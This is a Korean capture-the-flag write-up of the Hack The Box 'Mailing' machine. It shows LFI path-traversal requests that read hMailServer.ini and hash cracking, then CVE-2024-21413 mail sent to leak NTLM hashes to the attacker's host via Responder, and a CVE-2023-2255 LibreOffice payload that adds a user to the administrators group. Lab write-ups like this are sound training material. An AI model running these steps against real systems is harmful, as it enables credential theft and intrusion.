# HTB-MAILING
```bash
OS: Windows
DATE: 26.10.09
DIFFICULTY: Easy
```

## RECON
**nmap**: 전체 포트 검사 및 상세 포트 검사 이후 UDP 포트 검사까지 진행하였다
```bash
nmap -p- -T4 IP
```
```bash
nmap -sC -sV -p 25,80,110,135,139,143,445,587,993,5040,5985,7680,47001 mailing.htb | tee nmap
```
```bash
sudo nmap -sUV --top-ports 100 mailing.htb
```
포트 검사 결과 pop3, smtp, http, winrm 등 여러 서비스들이 나왔다. 따라서 웹 서비스 Fuzzing을 진행하였다
```bash
ffuf -u http://mailing.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -c -r 
```
```bash
ffuf -u http://mailing.htb//FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -c -r
```
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://mailing.htb/ -H "Host: FUZZ.mailing.htb"  -fs 4681
```
FUZZING 결과 **Instructions**라는 웹 디렉토리가 있다는 것을 알 수 있었다

## Initial Access
FUZZING 후 브라우저에 접속하여 확인한 결과 어떠한 PDF가 자동으로 다운로드되었다. PDF를 확인해보니 hMailServer 다운로드 및 여러 가지 내용이 들어가 있었다. 안에서 maya라는 사용자도 확인할 수 있었다. 이후 burpsuite를 사용하여 pdf 다운로드 받는 부분을 캡처하여 확인한 결과 `/download.php?file=instructions`라는 파라미터로 이동이 된다는 것을 알게 되었다. 따라서 LFI 취약점이 있을 수도 있다고 판단하여 download.php를 대상으로 확인해보았다
```html
GET /download.php?file=../download.php
```
확인 결과 download.php의 소스코드를 볼 수 있었고 LFI 취약점이 있다는 것을 알게 되었다. 따라서 바로 hMailServer라는 서비스를 사용하고 있기에 hMailServer의 config 파일을 찾기로 했다. 먼저 .ini 파일을 검색하였다. `hMailServer .ini location` 검색 결과 hMailServer.ini는 `C:\Program Files\hMailServer\Bin\hMailServer.ini` 위치에 있다는 것을 알게 되었다. 따라서 burpsuite에서 LFI 취약점을 이용하였다
```html
GET /download.php?file=../../../../../Program+Files/hMailServer/Bin/hMailServer.ini
```
시도 결과 없는 위치라고 떴다. 따라서 **x86**, 즉 32비트 프로그램 설정으로 하여 다시 한 번 더 시도하였다
```html
GET /download.php?file=../../../../../Program+Files+(x86)/hMailServer/Bin/hMailServer.ini
```
시도 결과 admin의 해시를 얻을 수 있었다
```ini
[Directories]
ProgramFolder=C:\Program Files (x86)\hMailServer
DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
DataFolder=C:\Program Files (x86)\hMailServer\Data
LogFolder=C:\Program Files (x86)\hMailServer\Logs
TempFolder=C:\Program Files (x86)\hMailServer\Temp
EventFolder=C:\Program Files (x86)\hMailServer\Events
[GUILanguages]
ValidLanguages=english,swedish
[Security]
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
[Database]
Type=MSSQLCE
Username=
Password=0a9f8ad8bf896b501dde74f08efd7e4c
PasswordEncryption=1
Port=0
Server=
Database=hMailServer
Internal=1
```
따라서 hash를 `hash.txt`에 넣어준 후 hashcat을 돌려 크랙한 결과 성공하였다
```bash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```
따라서 hMailServer admin credential을 얻었다. 하지만 초기에 admin 해시는 땄지만 이걸 어떻게 사용해야 할지 감이 안 왔다. 따라서 hMailServer 취약점을 검색해보았다. 하지만 쓸 만한 정보를 찾지 못하였다. 나는 메일 서비스의 최고 권한자이고, 그렇다면 이걸로 뭘 할 수 있을지를 생각해보았다. 나는 이제 임의의 사람에게 메일을 보낼 수 있고 그 메일에 악성코드를 넣어 쉘을 얻을 수 있다는 생각을 하게 되었다. 그래서 아까 pdf에서 얻은 정보인 **maya**라는 유저가 있는 것을 알기에 대상은 maya로 지정하였다. 또한 maya는 **outlook**을 쓴다는 것도 pdf에서 알 수 있었던 정보기에 outlook 취약점을 찾아보았다. 그 결과 `CVE-2024-21413` RCE 취약점을 발견할 수 있었다. 대상 취약점은 피해자가 악성 메일을 미리보기로 열기만 해도 피해자 컴퓨터가 공격자 서버로 자동 연결되어 NTLM 인증 정보를 넘겨주는 취약점이다. 따라서 [PoC](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)를 clone해준 후 responder를 켜주었다. 이후 PoC를 돌려주었다
```bash
sudo reponder -I tun0
```
```bash
python3 CVE-2024-21413.py --server 'mailing.htb' --port '587' --username 'administrator@mailing.htb' --password 'homenetworkingadministrator' --sender 'administrator@mailing.htb' --recipient 'maya@mailing.htb' --url "\\10.10.14.23\share\tmp" --subject "PoC"
```
responder 도구도 smb 계열이기 때문에 --url 위치에 아무 공유 폴더 이름을 적어주었다. 하지만 계속 없는 정보라고 떴다. 따라서 확인해본 결과 메일 서버에서 username은 항상 user@domain인 것을 알게 된 후 수정하여 다시 시도하였다
```bash
python3 CVE-2024-21413.py --server 'mailing.htb' --port '587' --username 'administrator@mailing.htb' --password 'homenetworkingadministrator' --sender 'administrator@mailing.htb' --recipient 'maya@mailing.htb' --url "\\IP\share\tmp" --subject "PoC"
```
```bash
sudo responder -I tun0

[SMB] NTLMv2-SSP Client   : 10.129.232.39
[SMB] NTLMv2-SSP Username : MAILING\maya
[SMB] NTLMv2-SSP Hash     : maya::MAILING:4de04030ba6cd877:35F0F40B2D0A6CF98437575E0A82A349:010100000000000000B7EC3D2B5ADD018CBFF0F922731BD90000000002000800560049003100430001001E00570049004E002D0035003500420050004C004B0054003500380054004B0004003400570049004E002D0035003500420050004
C004B0054003500380054004B002E0056004900310043002E004C004F00430041004C000300140056004900310043002E004C004F00430041004C000500140056004900310043002E004C004F00430041004C000700080000B7EC3D2B5ADD01060004000200000008003000300000000000000000000000002000001AF856D8C64D43DD6FAD394B64F79639AE
0DDC67EC10815D6B303159989224880A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320033000000000000000000
[*] Skipping previously captured hash for MAILING\maya
```
따라서 maya의 비밀번호 hash를 얻게 되어 maya_hash에 넣어준 후 john을 통하여 crack해주었다
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt maya_hash
```
크랙을 성공하여 winrm에 접속하여 유저 쉘을 얻을 수 있었다

![user](attach_real/Pasted%20image%2020261012092849.png)

## Privilege Escalation
유저 쉘을 얻은 후 whoami /all도 확인해보고 winPEAS도 돌려보았다. 하지만 많은 정보를 얻지 못하였다. 따라서 `Program Files`에 들어가서 확인한 결과 `LibreOffice`라는 프로그램이 눈에 띄었다. 따라서 LibreOffice 취약점을 검색한 결과 `CVE-2023-2255` 취약점이 있다는 것을 알게 되었다. 대상 취약점은 7.5 이하의 버전에서 동작하기에 LibreOffice의 버전을 확인해주었다
```ps1
C:\program files\LibreOffice\program\soffice.exe --version
```
확인 결과 7.4대인 것을 확인하여 바로 대상 취약점을 이용하려고 하였다. 하지만 PoC들이 모두 리눅스 대상이어서 여러 방법을 찾았다. 그중 윈도우용 [PoC](https://github.com/elweth-sec/CVE-2023-2255)를 찾게 되었다. 대상 PoC는 커맨드를 입력하면 이것을 LibreOffice의 확장자인 `.odt`로 바꾸어, 어드민이 사용하는 폴더에 넣으면 실행이 되는 것이었다. 따라서 PoC를 실행해주었다
```bash
python3 CVE-2023-2255.py --cmd 'net localgroup Administrator maya /add' --output 'exploit.odt'
```
exploit.odt를 만들어준 후 어떤 폴더가 admin과 같이 사용하는 폴더인지 확인한 결과 **C:\Important Documents**가 눈에 띄었다. 따라서 파일을 `C:\Important Documents` 위치로 옮겨준 후 어드민 그룹에 추가될 때까지 기다려주었다. 시간이 지나 `net user maya`를 확인해주었지만 그룹이 계속해서 바뀌지 않았다. 따라서 계속해서 확인하고 생각해본 결과 `net user maya`를 했을 때 결과가
```ps1
Local Group Memberships   *Remote Management Use*Usuarios
                          *Usuarios de escritori
```
이러했다. 일반적인 영어와 달랐다. 즉 이 문자, 이 OS는 스페인어로 된 windows였던 것이었다. 따라서 페이로드를 사용할 때도 administrator가 아니라 **Administradores**를 해야 admin 그룹에 추가가 되는 것이었다. 따라서 수정을 해주었다
```bash
python3 CVE-2023-2255.py --cmd 'net localgroup Administradores maya /add' --output 'exploit.odt'
```
이것을 다시 한 번 더 폴더에 추가해준 결과 admin 그룹에 들어갈 수 있었다. 하지만 여전히 admin 폴더에는 접근하지 못하였다. 따라서 다시 한 번 더 evil-winrm으로 접속한 결과 admin 플래그를 읽을 수 있었다
```bash
evil-winrm -i IP -u maya -p PASS
```

![root](attach_real/Pasted%20image%2020261012105636.png)

## New Inform
- smtp가 포트에 나왔다고 바로 telnet 등을 시도하지 말고 서비스를 확인하자
- 꼭 확장자 fuzzing까지 진행하자
- 문제에서 주는 pdf 등등을 항상 꼼꼼히 확인하자
- LFI 취약점이 있다면 항상 이용하고 있는 서비스의 config 파일을 확인하자
- .ini: 설정 파일. 프로그램이 어떻게 동작할지 저장하는 곳. 여기에 비번이나 DB 접속 정보 같은 민감 정보가 있을 수도 있음
- 설정 파일을 항상 검색하자. 윈도우는 .ini
- x86: 32비트 옛날 아키텍처
- 윈도우 LFI에서 Program Files가 나오면 항상 32비트 영역도 시도해야 한다
- 32비트에는 있을 수 있는데 64비트에는 없을 수도 있음
- 항상 내가 지금 뭘 땄는지, 어떤 걸 땄는지 생각해야 한다
- 메일 서비스에서 최고 권한자이면 당연히 메일 보낼 수 있는 계정이 생긴 거고, 그러면 보낼 대상을 찾아야 한다는 생각을 가져야 한다
- 주어진 단서들을 꼼꼼히 확인하자
- responder도 445 포트를 사용한다. 그리고 대상 도구는 해시 캡처가 유일한 목적인 도구
- responder도 smb 서버이기 때문에 공유 폴더 위치를 적어야 하는 상황이 온다면 아무 공유 폴더나 적어주면 된다
- 항상 PoC readme를 잘 읽어서 나온 대로 잘 수행하자
- 메일 서비스에서는 항상 도메인 유저네임을 사용해주자
- 습관: 유저명이 막히거나 그러면 `username`, `username@domain`, `domain\username`, `username@FQDN`
- 항상 권한 상승을 위해 Program Files를 확인하자
- 만약 PoC 정보가 없다면 `exploit tutorial` 이런 식으로 검색
- .odt: LibreOffice의 문서 파일
- 모르는 확장자면 검색해라
- 윈도우에서는 유저를 admin 그룹에 추가해주는 페이로드를 사용할 수 있다
- 항상 locale, language를 확인해주자. 따라서 권한들도 locale에 맞춰줘야 한다
- exploit 후 세션 토큰을 재설정해줘야 한다. 안 해주면 세션이 이어지기 때문에 권한이 바뀌지 않는다